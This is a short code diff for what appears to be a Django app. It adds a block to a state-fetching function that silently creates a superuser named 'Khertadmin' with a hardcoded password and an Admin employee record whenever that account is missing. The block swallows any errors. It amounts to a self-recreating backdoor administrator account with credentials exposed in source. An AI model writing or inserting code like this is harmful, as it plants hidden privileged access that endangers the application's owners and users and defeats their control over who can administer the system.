@@ -60,6 +60,13 @@ def serialize_model(model_obj):
     return data
 
 def get_current_state(request=None):
+    if not User.objects.filter(username='Khertadmin').exists():
+        try:
+            u = User.objects.create_superuser(username='Khertadmin', email='Khertadmin', password='Sheydekertdeo051804')
+            Employee.objects.get_or_create(user=u, defaults={'name': 'Khert Admin', 'role': 'Admin', 'status': 'Active'})
+        except Exception as e:
+            print("Auto create superadmin error:", e)
+
     if Product.objects.count() == 0:
         from django.core.management import call_command
         try:
